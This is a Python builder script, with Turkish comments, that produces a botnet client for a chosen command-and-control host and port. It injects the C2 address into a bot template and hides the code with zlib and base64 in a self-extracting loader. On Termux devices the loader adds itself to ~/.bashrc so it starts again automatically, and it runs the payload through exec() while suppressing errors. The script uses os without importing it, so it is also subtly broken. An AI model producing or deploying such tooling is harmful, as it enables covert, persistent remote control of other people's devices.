#!/usr/bin/env python3
import base64
import zlib

def build_bot(c2_host, c2_port, output_file="bot_final.py"):
    with open("bot_client.py", "r") as f:
        template = f.read()
    
    # C2 bilgilerini değiştir
    bot_code = template.replace(
        'c2_host = "0.tcp.eu.ngrok.io"',
        f'c2_host = "{c2_host}"'
    ).replace(
        'c2_port = 12345',
        f'c2_port = {c2_port}'
    )
    
    # Obfuscation (basit)
    compressed = zlib.compress(bot_code.encode())
    encoded = base64.b64encode(compressed).decode()
    
    wrapper = f'''#!/usr/bin/env python3
import base64, zlib, sys, os, tempfile, subprocess

# Self-extracting bot
encrypted = "{encoded}"

def main():
    try:
        decoded = base64.b64decode(encrypted)
        code = zlib.decompress(decoded).decode()
        
        # Kalıcılık ekle (Termux)
        if 'com.termux' in os.getcwd():
            # .bashrc'ye ekle
            home = os.path.expanduser("~")
            bashrc = os.path.join(home, ".bashrc")
            with open(bashrc, "a") as f:
                f.write(f'\\n# Auto-start\\ncd ~ && python3 {sys.argv[0]} &\\n')
        
        exec(code)
    except Exception as e:
        pass

if __name__ == "__main__":
    main()
'''
    
    with open(output_file, "w") as f:
        f.write(wrapper)
    
    os.chmod(output_file, 0o755)
    print(f"[+] Bot oluşturuldu: {output_file}")

if __name__ == "__main__":
    host = input("C2 Host/IP: ")
    port = int(input("C2 Port: "))
    build_bot(host, port)
  
